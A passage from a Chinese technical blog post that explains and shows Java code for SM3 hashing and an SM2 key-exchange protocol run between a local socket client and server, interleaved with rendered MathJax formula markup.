610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(5069.8,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(5514.5,0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(523,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(6441,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>与解密流程第3步计算的<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="16.603ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 7338.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="msub" transform="translate(278,0)"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(553,-150) scale(0.707)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g><g data-mml-node="mo" transform="translate(1417.7,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="msub" transform="translate(1695.7,0)"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mn" transform="translate(748,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(3125,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(4180.8,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(4569.8,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(5578.4,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(6023,0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(523,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(6949.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>相等。</li>
</ul>
</li>
</ol>
<h3 id="SM3摘要算法"><a href="#SM3摘要算法" class="headerlink" title="SM3摘要算法"></a>SM3摘要算法</h3><p>SM3是国家密码管理局于2010年12月17日发布的一种密码散列函数标准。在商用密码体系中，SM3主要用于数字签名及验证、消息认证码生成及验证、随机数生成等，其算法公开。据国家密码管理局表示，其安全性及效率与SHA-256相当。SM3核心代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">byte</span>[] md = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">32</span>];</span><br><span class="line">    <span class="type">byte</span>[] msg1 = <span class="string">"leeyuxun"</span>.getBytes();</span><br><span class="line">    <span class="type">SM3Digest</span> <span class="variable">sm3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SM3Digest</span>();</span><br><span class="line">    sm3.update(msg1, <span class="number">0</span>, msg1.length);</span><br><span class="line">    sm3.doFinal(md, <span class="number">0</span>);</span><br><span class="line">    System.out.print(Util.getHexString(md,<span class="literal">true</span>));</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200517001527.png"></p>
<h3 id="密钥协商设计"><a href="#密钥协商设计" class="headerlink" title="密钥协商设计"></a>密钥协商设计</h3><p>协商过程如下：</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200516215600.jpg"></p>
<p>结合具体的代码来解释上述协商过程。由于使用到socket进行双方的交互，设定Socket Client为User A，Socket Server为User B；</p>
<ol>
<li><p>Client向Server发起连接请求，后实例化一个SM2_Exchange对象A，得到其公私钥，并计算A的身份标识<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.345ex;" xmlns="http://www.w3.org/2000/svg" width="2.933ex" height="1.891ex" role="img" focusable="false" viewBox="0 -683 1296.3 835.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44D" d="M58 8Q58 23 64 35Q64 36 329 334T596 635L586 637Q575 637 512 637H500H476Q442 637 420 635T365 624T311 598T266 548T228 469Q227 466 226 463T224 458T223 453T222 450L221 448Q218 443 202 443Q185 443 182 453L214 561Q228 606 241 651Q249 679 253 681Q256 683 487 683H718Q723 678 723 675Q723 673 717 649Q189 54 188 52L185 49H274Q369 50 377 51Q452 60 500 100T579 247Q587 272 590 277T603 282H607Q628 282 628 271Q547 5 541 2Q538 0 300 0H124Q58 0 58 8Z"></path></g><g data-mml-node="mi" transform="translate(716,-152.7) scale(0.707)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></g></svg></mjx-container>，接着实例化一个Exch对象，并使用A的私钥初始化，产生一个随机数r充当临时私钥，得到<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.345ex;" xmlns="http://www.w3.org/2000/svg" width="3.105ex" height="1.891ex" role="img" focusable="false" viewBox="0 -683 1372.3 835.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path></g><g data-mml-node="mi" transform="translate(792,-152.7) scale(0.707)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></g></svg></mjx-container>；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> <span class="string">"127.0.0.1"</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">23333</span>;</span><br><span class="line"><span class="comment">//和server建立连接</span></span><br><span class="line"><span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(host, port);</span><br><span class="line">System.out.println(<span class="string">"client is working..."</span>);</span><br><span class="line"><span class="type">SM2_Exchange</span> <span class="variable">A</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SM2_Exchange</span>();</span><br><span class="line">A.generateKeyPair();<span class="comment">//</span></span><br><span class="line"><span class="type">byte</span>[] pubK_A = A.getPubKey();<span class="comment">//获得A的公钥</span></span><br><span class="line"><span class="type">byte</span>[] priK_A = A.getPriKey();<span class="comment">//获得A的私钥</span></span><br><span class="line"><span class="type">byte</span>[] ZA =<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">32</span>];</span><br><span class="line">A.computeZ(<span class="string">"A is a client"</span>,ZA);</span><br><span class="line"><span class="type">Exch</span> <span class="variable">A_EX</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Exch</span>();</span><br><span class="line">A_EX.Init(priK_A);</span><br><span class="line"><span class="type">ECPoint</span> <span class="variable">R_A</span> <span class="operator">=</span> A_EX.R1;<span class="comment">//获得RA</span></span><br><span class="line"><span class="type">byte</span> []RA = R_A.getEncoded();</span><br></pre></td></tr></table></figure>

<p>同时Server端接受Client发起的Socket连接后，进行与Client端进行相同的操作，得到<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex;" xmlns="http://www.w3.org/2000/svg" width="3.119ex" height="1.885ex" role="img" focusable="false" viewBox="0 -683 1378.7 833"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path></g><g data-mml-node="mi" transform="translate(792,-150) scale(0.707)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g></g></svg></mjx-container>；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">23333</span>;</span><br><span class="line"><span class="type">ServerSocket</span> <span class="variable">server</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerSocket</span>(port);</span><br><span class="line"><span class="comment">// 服务器端监听</span></span><br><span class="line">System.out.println(<span class="string">"server is waiting..."</span>);</span><br><span class="line"><span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> server.accept();</span><br><span class="line"><span class="type">SM2_Exchange</span> <span class="variable">B</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SM2_Exchange</span>();</span><br><span class="line">B.generateKeyPair(); </span><br><span class="line"><span class="type">byte</span>[] pubK_B = B.getPubKey();<span class="comment">//获得B的公钥  </span></span><br><span class="line"><span class="type">byte</span>[] priK_B = B.getPriKey();<span class="comment">//获得B的私钥</span></span><br><span class="line"><span class="type">byte</span>[] ZB =<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">32</span>];</span><br><span class="line">B.computeZ(<span class="string">"B is a server"</span>,ZB);</span><br><span class="line"><span class="type">Exch</span> <span class="variable">B_EX</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Exch</span>();</span><br><span class="line">B_EX.Init(priK_B);</span><br><span class="line"><span class="type">ECPoint</span> <span class="variable">R_B</span> <span class="operator">=</span> B_EX.R1;<span class="comment">//获得RB</span></span><br><span class="line"><span class="type">byte</span>[] RB = R_B.getEncoded(); </span><br></pre></td></tr></table></figure>

<p>其中Exch对象初始化的代码如下，参数为私钥，计算<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex;" xmlns="http://www.w3.org/2000/svg" width="2.705ex" height="1.885ex" role="img" focusable="false" viewBox="0 -683 1195.6 833"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path></g><g data-mml-node="mn" transform="translate(792,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></svg></mjx-container>的同时计算出<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex;" xmlns="http://www.w3.org/2000/svg" width="2.861ex" height="1.885ex" role="img" focusable="false" viewBox="0 -683 1264.6 833"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44B" d="M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z"></path></g><g data-mml-node="mn" transform="translate(861,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></svg></mjx-container>和<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="0.817ex" height="1.441ex" role="img" focusable="false" viewBox="0 -626 361 637"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g></g></g></svg></mjx-container>的值；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Init</span><span class="params">(<span class="type">byte</span>[] priKey)</span> </span><br><span class="line">    {</span><br><span class="line">        <span class="type">SM2</span> <span class="variable">sm2</span> <span class="operator">=</span> SM2.Instance();</span><br><span class="line">        w= sm2.ecc_w;</span><br><span class="line">        <span class="type">AsymmetricCipherKeyPair</span> <span class="variable">key</span> <span class="operator">=</span> sm2.ecc_key_pair_generator.generateKeyPair();  </span><br><span class="line">        <span class="type">ECPrivateKeyParameters</span> <span class="variable">ecpriv</span> <span class="operator">=</span> (ECPrivateKeyParameters) key.getPrivate();  </span><br><span class="line">        <span class="type">ECPublicKeyParameters</span> <span class="variable">ecpub</span> <span class="operator">=</span> (ECPublicKeyParameters) key.getPublic();</span><br><span class="line">        <span class="type">BigInteger</span> <span class="variable">r</span> <span class="operator">=</span> ecpriv.getD();  <span class="comment">//随机数r，在这是用临时私钥代替</span></span><br><span class="line">        R1 = ecpub.getQ();  <span class="comment">//临时私钥对应的临时公钥，也就是R1</span></span><br><span class="line">        <span class="type">BigInteger</span> <span class="variable">x1</span> <span class="operator">=</span> R1.getX().toBigInteger();<span class="comment">//取出R1的横坐标x1        </span></span><br><span class="line">        <span class="type">BigInteger</span> <span class="variable">x_1</span> <span class="operator">=</span> computeX(w,x1);        </span><br><span class="line">        compute_t(priKey,x_1,r);<span class="comment">//计算t        </span></span><br><span class="line">    }</span><br></pre></td></tr></table></figure></li>
<li><p>接下来A需要初始化一个Negotiation对象，即需要发送给B的交换数据包括<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="8.207ex" height="2.149ex" role="img" focusable="false" viewBox="0 -750 3627.7 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mi" transform="translate(675,-152.7) scale(0.707)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 